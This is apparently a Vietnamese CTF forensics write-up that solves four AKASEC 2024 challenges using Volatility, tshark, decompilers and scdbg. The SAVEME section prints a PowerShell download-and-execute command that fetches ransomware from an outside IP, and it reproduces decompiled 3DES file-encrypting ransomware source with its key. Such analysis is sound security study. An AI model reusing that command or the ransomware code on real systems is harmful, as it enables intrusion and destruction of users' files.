cozybear@cozybear:~/RealCoZy/volatility$ python vol.py -f /../../CTF/2024/AKASEC\\ CTF/Forensics/Portugal/memdump1.mem --profile=Win10x86 chromehistory Volatility Foundation Volatility Framework 2.6.1 Index URL Title Visits Typed Last Visit Time Hidden Favicon ID ------ -------------------------------------------------------------------------------- -------------------------------------------------------------------------------- ------ ----- -------------------------- ------ ---------- 21 https://www.google.com/search?q=9-+Y_\u0026amp;s...BGAqSBwMzLjagB8st\u0026amp;sclient=gws-wiz-serp 9- Y_ - Recherche Google 2 0 2024-05-28 02:51:46.820554 N/A 24 https://www.google.com/search?q=12-+ch\u0026amp;...EYFJIHAzQuNqAHsyw\u0026amp;sclient=gws-wiz-serp 12- ch - Recherche Google 2 0 2024-05-28 02:52:17.549779 N/A 23 https://www.google.com/search?q=11-+r_\u0026amp;...EYFJIHAzMuNqAHuSU\u0026amp;sclient=gws-wiz-serp 11- r_ - Recherche Google 2 0 2024-05-28 02:52:08.117933 N/A 22 https://www.google.com/search?q=10-+f0\u0026amp;...SSBwUxLjYuMaAHoys\u0026amp;sclient=gws-wiz-serp 10- f0 - Recherche Google 2 0 2024-05-28 02:51:58.554055 N/A 28 https://www.google.com/search?q=14-+m3\u0026amp;...EYFJIHAzMuNqAHwCQ\u0026amp;sclient=gws-wiz-serp 14- m3 - Recherche Google 2 0 2024-05-28 02:54:23.297460 N/A 27 https://www.google.com/search?q=13-+r0\u0026amp;...BGBSSBwMxLjagB5Qn\u0026amp;sclient=gws-wiz-serp 13- r0 - Recherche Google 2 0 2024-05-28 02:54:13.281851 N/A 60 https://www.google.com/search?q=look+!!...jBqN6gCALACAA\u0026amp;sourceid=chrome\u0026amp;ie=UTF-8 look !! its here yay - Recherche Google 2 0 2024-05-28 10:21:27.769063 N/A 41 https://www.google.com/search?q=18-+h_\u0026amp;...EYFJIHAzIuNqAHwCg\u0026amp;sclient=gws-wiz-serp 18- h_ - Recherche Google 2 0 2024-05-28 02:58:34.283051 N/A 40 https://www.google.com/search?q=21-+0r\u0026amp;...BGBSSBwMyLjagB_8m\u0026amp;sclient=gws-wiz-serp 21- 0r - Recherche Google 2 0 2024-05-28 02:58:16.846367 N/A 39 https://www.google.com/search?q=19-+h1\u0026amp;...U���u�U �����]� �����������̋�U���u �U �!���]� �����������̋ -1 0 1601-01-01 00:00:00 N/A 38 https://www.google.com/search?q=20-+st\u0026amp;...wLjMuMS4wLjKgB4Ak\u0026amp;sclient=gws-wiz-serp 20- st - Recherche Google 2 0 2024-05-28 02:57:55.750520 N/A 37 https://www.google.com/search?q=22-+y%7...wcyLjUuNC0xoAeSIg\u0026amp;sclient=gws-wiz-serp 22- y} - Recherche Google 2 0 2024-05-28 02:57:40.251468 N/A 30 https://www.google.com/search?q=16-+34\u0026amp;...HBzMuNS4wLjGgB8Uf\u0026amp;sclient=gws-wiz-serp 16- 34 - Recherche Google 2 0 2024-05-28 02:54:40.616572 N/A 29 https://www.google.com/search?q=15-+_s\u0026amp;...EYFJIHAzMuNqAH3iI\u0026amp;sclient=gws-wiz-serp 15- _s - Recherche Google 2 0 2024-05-28 02:54:33.267901 N/A 6 https://www.google.com/search?q=3-+EC\u0026amp;s...�l�(�X 0 0 1601-01-01 00:00:00 N/A 3 https://www.google.com/search?q=1-+AK\u0026amp;s...�E ���%����E �Ё���u � ЉVf��t f��tf��uT�G@ -117 0 1601-01-01 00:00:00 N/A 3 https://www.google.com/search?q=1-+AK\u0026amp;s... 0 0 1601-01-01 00:00:00 N/A 13 https://www.google.com/search?q=6-+4T\u0026amp;s...BGAqSBwMxLjWgB-Mk\u0026amp;sclient=gws-wiz-serp 6- 4T - Recherche Google 2 0 2024-05-28 02:48:50.824655 N/A 8 https://www.google.com/search?q=5-+0L\u0026amp;s...AYIkgcDMS41oAfEJQ\u0026amp;sclient=gws-wiz-serp 5- 0L - Recherche Google 2 0 2024-05-28 02:47:32.309413 N/A 7 https://www.google.com/search?q=4-+%7BV...gDAJIHAzQuNaAH6jU\u0026amp;sclient=gws-wiz-serp 4- {V - Recherche Google 2 0 2024-05-28 02:47:15.630030 N/A 6 https://www.google.com/search?q=3-+EC\u0026amp;s...BGAqSBwMzLjSgB94m\u0026amp;sclient=gws-wiz-serp 3- EC - Recherche Google 2 0 2024-05-28 02:47:03.137648 N/A 4 https://www.google.com/search?q=2-+AS\u0026amp;s...RgKkgcDNy41oAfTMg\u0026amp;sclient=gws-wiz-serp 2- AS - Recherche Google 2 0 2024-05-28 02:45:40.828749 N/A 3 https://www.google.com/search?q=1-+AK\u0026amp;s...�P���������R���� �(V 0 0 1601-01-01 00:00:00 N/A 36 https://www.google.com/search?q=17-+rc\u0026amp;...HBzEuNS4wLjGgB-It\u0026amp;sclient=gws-wiz-serp 17- rc - Recherche Google 2 0 2024-05-28 02:57:24.214070 N/A 15 https://www.google.com/search?q=8-+1T\u0026amp;s...pIHBTMuNS4xoAfeIg\u0026amp;sclient=gws-wiz-serp 8- 1T - Recherche Google 2 0 2024-05-28 02:49:12.465347 N/A 14 https://www.google.com/search?q=7-+1L\u0026amp;s...BGBSSBwMyLjWgB7cq\u0026amp;sclient=gws-wiz-serp 7- 1L - Recherche Google 2 0 2024-05-28 02:48:59.903786 N/A 39 https://www.google.com/search?q=19-+h1\u0026amp;...BGBSSBwMyLjagB-8p\u0026amp;sclient=gws-wiz-serp 19- h1 - Recherche Google 2 0 2024-05-28 02:58:06.309885 N/A ISkL)��1���6�[/www.google.com/search?q=8-+1T\u0026amp;s...��� �[�[�Ë؋s\u0026lt; �tx�~ ��N-�P�u�� 87 0 1601-01-01 00:00:00 N/A 3 https://www.google.com/search?q=1-+AK\u0026amp;s...BGBSSBwM2LjOgB-Yn\u0026amp;sclient=gws-wiz-serp 1- AK - Recherche Google 2 0 2024-05-28 02:45:26.511498 N/A 29 https://www.google.com/search?q=15-+_s\u0026amp;...EYFJIHAzMuNqAH3iI\u0026amp;sclient=gws-wiz-serp 15- _s - Recherch�p# 0 0 1601-01-01 00:00:00 N/A Để ý kĩ ta thấy cờ được chia thành các phần nhỏ, đính kèm cả thứ tự. Chỉ cần sắp xếp lại là ta có được cờ.\nCách 2: Dump file History Khi tìm kiếm bằng Chrome trên Window. Lịch sử sẽ được lưu ở file History. Mình dùng filescan để tìm kiếm.\n/home/cozybear/RealCoZy/ToolList/volatility3/vol.py -f memdump1.mem windows.filescan | grep \u0026#34;History\u0026#34; 0x81595680 100.0\\Users\\d33znu75\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History 128 0x9845ab30 \\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\CacheManager\\MpScanCache-0.bin 128 Sau đó dump nó ra bằng plugin dumpfile. Cat file ta sẽ thấy các link tìm kiếm. Tương tự tìm kiếm hết các link sẽ có được cờ đầy đủ.\nFLAG: AKASEC{V0L4T1TY_f0r_chr0m3_s34rch_h1st0ry}\n2.For/Sussy # Something Fishy\u0026rsquo;s Going on in Our Network Author : d33znu75\nĐề bài cho 1 file pcapng. Mở file lên và tìm kiếm một lúc,mình để ý các luồng DNS có gì đó:\nKĩ thuật này gọi là DNS Tunneling. Mình sẽ filter chúng ra và chỉnh sửa lại một chút để dễ xem hơn.\n# Lọc dữ liệu từ DNS stream tshark -r packet.pcapng -Y \u0026#34;dns\u0026#34; -T fields -e dns.qry.name \u0026gt; out.txt # Giữ lại các dòng chứa akasec.ma grep \u0026#34;akasec.ma\u0026#34; out.txt \u0026gt; out2.txt # Loại bỏ trùng lặp cat out2.txt | uniq \u0026gt; out3.txt Sau đó mình loại bỏ từ akasec.ma bằng VScode. Đưa vào Cyberchef, mình nhận được 1 file 7z. Nó yêu cầu mật khẩu nên mình crack bằng john \u0026gt; pass: hellokitty. Sau đó ta được 1 file flag. Đó là 1 file PDF yêu cầu password. Tương tự dùng john \u0026gt; pass: meow. Ta được flag sau khi mở.\nFLAG: AKASEC{PC4P_DNS_3xf1ltr4t10n_D0n3!!}\n3.For/SAVEME # You know what to do.Get after it! WARNING: \u0026ldquo;It\u0026rsquo;s a malware,BE CAREFUL\u0026rdquo; Author: samaqlo\nĐề bài cho 1 file zip chứa 1 file .docm và 1 số file png,jpeg. Thử dùng olevba với file docm như mình thường làm nhưng nó không ra gì. Mở nó lên bằng trình đọc trên Kali, ta có thể thấy 1 số trang với chữ bị ẩn đi.\nCopy all, bỏ vào VScode, dùng Replace bỏ đi \u0026amp;H. Đưa vào Cyberchef, ta thấy đó là 1 file PE 32. Save nó và dùng Virustotal check, nói chung là đỏ lòm luôn. Ý tưởng của mình là xem nó được viết bằng gì sau đó decompile nó. Dùng DIE thử:\n──(kali㉿kali)-[~/Downloads] └─$ diec fuckingMS.exe --heuristicscan --verbose [HEUR/About] Generic Heuristic Analysis by DosX (@DosX_dev) [HEUR] Scanning has begun! [HEUR] Scanning to programming language has started! [HEUR] Scan completed. PE32 Operation system: Windows(95)[I386, 32-bit, GUI] Linker: GNU Linker ld (GNU Binutils)(2.56*)[GUI32] Compiler: MinGW Language: C/C++ (Heur)Protection: Generic[No IAT] (Heur)Packer: Packer detected[Section 1 (\u0026#34;.data\u0026#34;) compressed] Nó được viết bằng C/C++. Mình thử run nó trên ANYRUN nhưng không hiểu sao ANYRUN của mình nó không bao giờ chạy ra cái gì :))). Thử decompile nó bằng IDA pro cũng không thành công (tất nhiên vì nó bị packed). DIE cũng không phát hiện ra công cụ packed nó. Mình tìm kiếm trình giả lập Window thì nó ra cái speakeasy. Nhưng cũng không được, nó báo error read. Stuck mãi thì mình nhớ ra 1 chall của BtSCTF mình có sử dụng scdbg để chạy Window API. Thử sử dụng nó ai ngờ ra thật.\nLoaded 122a bytes from file C:\\Users\\ozkado\\DOWNLO~1\\Ohshit.exe Testing 4650 offsets | Percent Complete: 99% | Completed in 281 ms 0) offset=0x401 steps=MAX final_eip=7c86250d WinExec Loaded 122a bytes from file C:\\Users\\ozkado\\DOWNLO~1\\Ohshit.exe Initialization Complete.. Max Steps: 2000000 Using base offset: 0x401000 Execution starts at file offset 401 401401 DAD9 fcmovu st(0),st(1) 401403 B88A0C4406 mov eax,0x6440c8a 401408 D97424F4 fstenv [esp-0xc] 40140c 5D pop ebp 40140d 29C9 sub ecx,ecx 4014c4 WinExec(powershell \u0026#34;IEX(New-Object Net.webClient).downloadString(\u0026#39;http://20.81.130.178:8080/ransomware.exe\u0026#39;)\u0026#34;) 4014d0 GetVersion() 4014e3 ExitProcess(0) Stepcount 555874 Nó download 1 file theo URL http://20.81.130.178:8080/ransomware.exe. Do mình giải lại sau giải nên mình phải tìm file này từ 1 bài WU khác. Dùng DIE ta biết nó là 1 file .NET. Dùng Dotpeek để decompile nó ra, mình thấy có 3 hàm nhỏ hơn trong đó. Trong đó hàm b():\n// Decompiled with JetBrains decompiler // Type: b // Assembly: ransomware, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null // MVID: 81F24F4C-AD49-415D-95E1-CE0D740B8FA4 // Assembly location: C:\\Users\\ozkado\\Downloads\\ransomware.exe using System; using System.IO; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; #nullable disable internal class b { private static void a([In] string[] obj0) { string str1 = \u0026#34;Lp3jXluuW799rnu4\u0026#34;; byte[] numArray1 = new byte[8] { (byte) 0, (byte) 1, (byte) 2, (byte) 3, (byte) 4, (byte) 5, (byte) 6, (byte) 7 }; \\u003CModule\\u003E.h = 2081625616; byte[] numArray2 = numArray1; string currentDirectory = Directory.GetCurrentDirectory(); \\u003CModule\\u003E.k = -1592258590; \\u003CModule\\u003E.a = (object) null; \\u003CModule\\u003E.n = -1592516334; \\u003CModule\\u003E.l = -1437277352; \\u003CModule\\u003E.d = (object) 1386028750; string[] files = Directory.GetFiles(currentDirectory, \u0026#34;*.*\u0026#34;); \\u003CModule\\u003E.n = 2136656571; string[] strArray1 = files; \\u003CModule\\u003E.d = (object) null; string[] strArray2 = strArray1; int index = 0; bool flag1; \\u003CModule\\u003E.g = (object) flag1; string str2; bool flag2; while (true) { \\u003CModule\\u003E.k = 1326660401; \\u003CModule\\u003E.e = (object) 1818084011; int num1 = index; string[] strArray3 = strArray2; \\u003CModule\\u003E.j = -1529522494; int length = strArray3.Length; int num2 = num1 \u0026lt; length ? 1 : 0; \\u003CModule\\u003E.o = 1526447315; \\u003CModule\\u003E.j = 1987339265; flag2 = num2 != 0; int num3 = flag2 ? 1 : 0; \\u003CModule\\u003E.a = (object) null; if (num3 != 0) { \\u003CModule\\u003E.j = 1845842485; TripleDESCryptoServiceProvider cryptoServiceProvider1; \\u003CModule\\u003E.c = (object) cryptoServiceProvider1; str2 = strArray2[index]; Exception exception1; try { \\u003CModule\\u003E.q = -759738571; \\u003CModule\\u003E.b = (object) null; \\u003CModule\\u003E.q = 1898371779; string path1 = str2; global::a.b = (object) flag2; byte[] numArray3 = File.ReadAllBytes(path1); \\u003CModule\\u003E.g = (object) null; global::a.b = (object) \u0026#34;185ee01d-8c67-459c-9586-6804417e592ce434881f-7f35-4ffd-bdf6-4a1f244e25084e41b92d-afec-\u0026#34;; \\u003CModule\\u003E.d = (object) null; byte[] numArray4 = numArray3; \\u003CModule\\u003E.h = 1308380089; cryptoServiceProvider1 = new TripleDESCryptoServiceProvider(); TripleDESCryptoServiceProvider cryptoServiceProvider2 = cryptoServiceProvider1; Encoding ascii = Encoding.ASCII; string s = str1; \\u003CModule\\u003E.k = 401140706; byte[] bytes1 = ascii.GetBytes(s); cryptoServiceProvider2.Key = bytes1; \\u003CModule\\u003E.o = 1203310366; TripleDESCryptoServiceProvider cryptoServiceProvider3 = cryptoServiceProvider1; byte[] numArray5 = numArray2; c.b = (object) str1; cryptoServiceProvider3.IV = numArray5; byte[] numArray6 = global::b.b(numArray4, cryptoServiceProvider1); string path2 = str2; byte[] bytes2 = numArray6; \\u003CModule\\u003E.n = -1749758540; File.WriteAllBytes(path2, bytes2); global::a.b = (object) \u0026#34;102abfb4-ec8b-4922-9b54-2f17b2c5b52d6d\u0026#34;; string str3 = str2; \\u003CModule\\u003E.a = (object) exception1; Console.WriteLine(\u0026#34;Encrypted: \u0026#34; + str3); c.b = (object) 1876936332; } catch (Exception ex) { \\u003CModule\\u003E.m = -1040838703; exception1 = ex; Exception exception2 = exception1; global::a.b = (object) cryptoServiceProvider1; string str4 = \u0026#34;Error: \u0026#34; + exception2.Message; \\u003CModule\\u003E.o = 1057425350; \\u003CModule\\u003E.d = (object) null; Console.WriteLine(str4); global::a.b = (object) \u0026#34;dd91927e-4e7c-4176-b90a-bb4a9049b638480c140d-829f-4\u0026#34;; \\u003CModule\\u003E.e = (object) 1957620381; \\u003CModule\\u003E.a = (object) null; \\u003CModule\\u003E.m = -1748580011; \\u003CModule\\u003E.m = -1932913121; \\u003CModule\\u003E.q = 2097519326; } \\u003CModule\\u003E.c = (object) str2; \\u003CModule\\u003E.k = 480802764; \\u003CModule\\u003E.a = (object) flag2; c.b = (object) null; \\u003CModule\\u003E.h = index; \\u003CModule\\u003E.g = (object) str1; int num4 = index; \\u003CModule\\u003E.k = 2071185029; int num5 = num4 + 1; c.a = (object) cryptoServiceProvider1; \\u003CModule\\u003E.g = (object) null; // ISSUE: variable of a boxed type __Boxed\u0026lt;int\u0026gt; local = (ValueType) 1952428595; \\u003CModule\\u003E.q = 1809257038; c.b = (object) local; index = num5; } else break; } Console.ReadLine(); \\u003CModule\\u003E.j = index; int num = flag2 ? 1 : 0; \\u003CModule\\u003E.o = 721847420; \\u003CModule\\u003E.l = 796469985; \\u003CModule\\u003E.q = -1051365525; \\u003CModule\\u003E.n = index; \\u003CModule\\u003E.f = (object) (bool) num; c.a = (object) str2; } private static byte[] b([In] byte[] obj0, [In] TripleDESCryptoServiceProvider obj1) { MemoryStream memoryStream = new MemoryStream(); CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, obj1.CreateEncryptor(), CryptoStreamMode.Write); cryptoStream.Write(obj0, 0, obj0.Length); cryptoStream.FlushFinalBlock(); byte[] array = memoryStream.ToArray(); memoryStream.Close(); cryptoStream.Close(); return array; } } Nó là mã hóa 3DES. Từ đoạn:\nstring str1 = \u0026#34;Lp3jXluuW799rnu4\u0026#34;; byte[] numArray1 = new byte[8] { (byte) 0, (byte) 1, (byte) 2, (byte) 3, (byte) 4, (byte) 5, (byte) 6, (byte) 7 }; Mình có key = Lp3jXluuW799rnu4, và IV = 00 01 02 03 04 05 06 07. Nếu muốn rõ hơn tại sao numArray1 là IV bạn có thể sử dụng ILSpy, ta sẽ được đoạn mã như sau:\ntring text = \u0026#34;Lp3jXluuW799rnu4\u0026#34;; byte[] obj = new byte[8] { 0, 1, 2, 3, 4, 5, 6, 7 }; \u0026lt;Module\u0026gt;.h = 2081625616; byte[] iV = obj; string currentDirectory = Directory.GetCurrentDirectory(); \u0026lt;Module\u0026gt;.k = -1592258590; \u0026lt;Module\u0026gt;.a = null; \u0026lt;Module\u0026gt;.n = -1592516334; \u0026lt;Module\u0026gt;.l = -1437277352; \u0026lt;Module\u0026gt;.d = 1386028750; Giờ chỉ cần giải mã từng ảnh.Ở file images (144).png ta sẽ tìm được cờ. FLAG: AKASEC{F_MiCRoSft_777}\n4.For/snooz # don\u0026rsquo;t wake me up, I want a snooze u will find everything on my laptop!! https://we.tl/t-66EoXGwbVQ Author: samaqlo\nThử thách cung cấp 2 file bao gồm 1 file .pcapng và 1 file memdump. Mình mở file pcap lên xem có gì extract được không thì được 1 file có tên download.dat. Load nó vào Cyberchef, ta nhận thấy đó là 1 file PE. Dùng DIE, mình biết nó là 1 file .NET. Dùng Dotpeek decompile mình có được đoạn mã sau:\n// Decompiled with JetBrains decompiler // Type: a // Assembly: snooz, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null // MVID: 5E97E3D5-2139-4CF2-BD79-500B6A4DB0E0 // Assembly location: C:\\Users\\ozkado\\OneDrive - Thuyloi University\\download.exe using System; using System.Net; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Security.Cryptography; using System.Text; #nullable disable internal class a { private const int a = 1337; private const string b = \u0026#34;fr33___p4l3571n3\u0026#34;; private static void a() { TcpListener tcpListener1 = new TcpListener(IPAddress.Any, 1337); \\u003CModule\\u003E.l = -1592258590; TcpListener tcpListener2 = tcpListener1; // ISSUE: variable of a boxed type __Boxed\u0026lt;int\u0026gt; local = (ValueType) 1386028750; \\u003CModule\\u003E.o = 2136656571; \\u003CModule\\u003E.e = (object) local; \\u003CModule\\u003E.a = (object) null; tcpListener2.Start(); bool flag1; \\u003CModule\\u003E.h = (object) flag1; while (true) { bool flag2 = true; \\u003CModule\\u003E.k = 1987339265; \\u003CModule\\u003E.a = (object) null; \\u003CModule\\u003E.g = (object) flag2; int length1; \\u003CModule\\u003E.p = length1; \\u003CModule\\u003E.r = -1051365525; NetworkStream stream; global::b.a = (object) stream; TcpClient tcpClient = tcpListener1.AcceptTcpClient(); \\u003CModule\\u003E.i = 1057425350; stream = tcpClient.GetStream(); byte[] numArray1 = new byte[1024]; \\u003CModule\\u003E.e = (object) null; byte[] numArray2 = numArray1; \\u003CModule\\u003E.i = -1411494653; NetworkStream networkStream = stream; byte[] buffer = numArray2; \\u003CModule\\u003E.k = 1657774894; \\u003CModule\\u003E.q = 744302617; int length2 = numArray2.Length; length1 = networkStream.Read(buffer, 0, length2); byte[] numArray3 = new byte[length1]; byte[] sourceArray = numArray2; byte[] destinationArray = numArray3; int n; int num1; int num2; if ((4062 \u0026amp; (length1 \u0026lt;\u0026lt; 11) - 5420) != 0) { int num3 = 4 \u0026amp; (length1 + length1 * 15 ^ 1587); n = \\u003CModule\\u003E.n; int num4 = 4 \u0026amp; n \u0026lt;\u0026lt; 8 \u0026gt;\u0026gt;\u0026gt; 5; num2 = num3 != num4 ? -2076188109 ^ 422676110 : sizeof (long) + 17256; } else { num1 = checked (2069871130 - 132655268); num2 = num1; } int num5 = sizeof (Guid) + 18172; int num6 = sizeof (float) + 107; \\u003CModule\\u003E.d = (object) \\u003CModule\\u003E.c(num2, num5, num6); int length3 = length1; Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 0, length3); \\u003CModule\\u003E.n = -1040838703; \\u003CModule\\u003E.d = (object) length1; byte[] numArray4 = numArray3; int num7 = (7364 + (num1 \u0026lt;\u0026lt; 29) \u0026gt;\u0026gt;\u0026gt; 29 \u0026amp; 2) == (~num1 - 2958 \u0026amp; 2) ? (((n * -1073741824 \u0026gt;\u0026gt;\u0026gt; 10 ^ n * 57 + 7 * n) \u0026amp; 57) == 0 ? Type.EmptyTypes.Length + 45957 : Type.EmptyTypes.Length + 695708289) : -1673074294 ^ 37606627; int num8 = checked (1218888041 - 1218841169); int num9; if ((uint) length1 / 16039U != 2449857621U) { int q = \\u003CModule\\u003E.q; num9 = 5009 + (q \u0026lt;\u0026lt; 20) + 483840 == ~(q * 1073741824) \u0026gt;\u0026gt;\u0026gt; 17 ? Type.EmptyTypes.Length - 1963321438 : Type.EmptyTypes.Length + 182; } else { int o = \\u003CModule\\u003E.o; num9 = o * 12966 - -131 != (int) ((uint) o % 256U / 1972U \u0026gt;\u0026gt; 23) ? Type.EmptyTypes.Length - 884098835 : Type.EmptyTypes.Length + 1457581078; } string str1 = \\u003CModule\\u003E.c(num7, num8, num9); byte[] numArray5 = global::a.b(numArray4, str1); \\u003CModule\\u003E.e = (object) null; Encoding utF8 = Encoding.UTF8; byte[] bytes = global::a.c(numArray5); \\u003CModule\\u003E.r = 2097519326; \\u003CModule\\u003E.d = (object) \\u003CModule\\u003E.c(44666, sizeof (int) + 45636, Type.EmptyTypes.Length + 219); string str2 = utF8.GetString(bytes); string str3 = \\u003CModule\\u003E.c(sizeof (double) + 21715, 22728, sizeof (Guid) + 95); \\u003CModule\\u003E.i = 1503776956; string str4 = str2; Console.WriteLine(str3 + str4); global::b.b = (object) 1952428595; tcpClient.Close(); \\u003CModule\\u003E.k = -1529522494; } } private static byte[] b([In] byte[] obj0, [In] string obj1) { Aes aes1 = Aes.Create(); ICryptoTransform cryptoTransform1; byte[] numArray1; bool flag1; try { \\u003CModule\\u003E.i = 2081625616; Aes aes2 = aes1; Encoding utF8 = Encoding.UTF8; string s = obj1; \\u003CModule\\u003E.m = -1437277352; \\u003CModule\\u003E.r = -1871252905; byte[] bytes = utF8.GetBytes(s); aes2.Key = bytes; Aes aes3 = aes1; \\u003CModule\\u003E.q = -1852116043; \\u003CModule\\u003E.e = (object) null; aes3.Mode = CipherMode.ECB; \\u003CModule\\u003E.l = -1410905245; ICryptoTransform cryptoTransform2; ICryptoTransform cryptoTransform3 = cryptoTransform2; \\u003CModule\\u003E.k = 1845842485; \\u003CModule\\u003E.c = (object) cryptoTransform3; Aes aes4 = aes1; \\u003CModule\\u003E.b = (object) null; \\u003CModule\\u003E.h = (object) null; string str = \\u003CModule\\u003E.c(Type.EmptyTypes.Length + 8801, sizeof (uint) + 9765, sizeof (float) + 89); bool flag2; \\u003CModule\\u003E.d = (object) flag2; \\u003CModule\\u003E.d = (object) str; aes4.Padding = PaddingMode.None; \\u003CModule\\u003E.i = 1308380089; ICryptoTransform decryptor = aes1.CreateDecryptor(); \\u003CModule\\u003E.m = -1557401652; cryptoTransform1 = decryptor; try { \\u003CModule\\u003E.p = 1203310366; ICryptoTransform cryptoTransform4 = cryptoTransform1; byte[] inputBuffer = obj0; byte[] numArray2 = obj0; Aes aes5 = aes1; \\u003CModule\\u003E.o = -2051646939; global::b.b = (object) aes5; int length = numArray2.Length; numArray1 = cryptoTransform4.TransformFinalBlock(inputBuffer, 0, length); } finally { ICryptoTransform cryptoTransform5 = cryptoTransform1; \\u003CModule\\u003E.a = (object) numArray1; global::b.b = (object) 1876936332; flag1 = cryptoTransform5 == null; if (!flag1) cryptoTransform1.Dispose(); \\u003CModule\\u003E.o = -1978466511; } } finally { ICryptoTransform cryptoTransform6 = cryptoTransform1; \\u003CModule\\u003E.n = -1932913121; \\u003CModule\\u003E.a = (object) null; \\u003CModule\\u003E.f = (object) 1957620381; \\u003CModule\\u003E.c = (object) cryptoTransform6; \\u003CModule\\u003E.q = -1950879357; Aes aes6 = aes1; Aes aes7 = aes1; \\u003CModule\\u003E.a = (object) flag1; \\u003CModule\\u003E.h = (object) aes7; global::b.b = (object) null; \\u003CModule\\u003E.r = 1809257038; \\u003CModule\\u003E.h = (object) null; global::b.a = (object) cryptoTransform1; \\u003CModule\\u003E.i = -563903361; bool flag3 = aes6 == null; \\u003CModule\\u003E.f = (object) 1818084011; if (!flag3) aes1.Dispose(); } \\u003CModule\\u003E.m = 796469985; \\u003CModule\\u003E.o = -1980982856; return numArray1; } private static byte[] c([In] byte[] obj0) { int num = (int) obj0[obj0.Length - 1]; byte[] destinationArray = new byte[obj0.Length - num]; Array.Copy((Array) obj0, (Array) destinationArray, destinationArray.Length); return destinationArray; } } Ở hàm b() ta có thể thấy nó sử dụng mã hóa AES trên cổng 1337 với key = fr33___p4l3571n3. Giờ ta cần lấy thông tin đã được mã hóa:\ntshark -2 -r pcapFile.pcapng -R \u0026#34;tcp.port == 1337\u0026#34; -T fields -e data \u0026gt; datafile.txt ## Đoạn thông tin mã hóa 12c6b9acfc4f81810dd21f652bbfd6af6f3171b1be6ae86b058cbee8887f29a361d21ef8f12ff0594c4d217a3feef8a7d993e4c7bb1fea531af0e6259c4b466629e89109ed1d5ba3f3534dacc171266613ae8d24b73bef16426d079dd1d630011899962bd6e1cf2e574ebce9cc224f626fc58fea72add0be454ab6294fe2df119cce1284440e409fc07aa482de82a1b20e449b0133eed2e00a240569c4650ffa Decode nó bằng Cyberchef: Ta có pass của paste. Strings và grep file memdump để tìm link pastecode.\n┌──(kali㉿kali)-[~/Downloads/Snooz/snooz_chall] └─$ strings memdump.mem| grep \u0026#34;pastecode\u0026#34; \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 -4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 aa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\\\?\\DISPLAY#Default_Monitor#4\u0026amp;17f0ff54\u0026amp;0\u0026amp;UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\\\?\\DISPLAY#Default_Monitor#4\u0026amp;17f0ff54\u0026amp;0\u0026amp;UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\\\?\\DISPLAY#Default_Monitor#4\u0026amp;17f0ff54\u0026amp;0\u0026amp;UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4ManagedPosition=DeviceId:\\\\?\\DISPLAY#Default_Monitor#4\u0026amp;17f0ff54\u0026amp;0\u0026amp;UID0#{e6f07b5f-ee97-4a90-b076-33f57bf4eaa7};Position=682,50;Size=320,320Yellow26ca61a2-0663-47cf-9ba9-95e61a6be8c10347e22a-acbf-431b-9a0b-6873fdb426ad \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 \\id=d58faa36-fd6c-4d85-832a-0fef9b5b7025 https://pastecode.io/s/9oz9u9h4 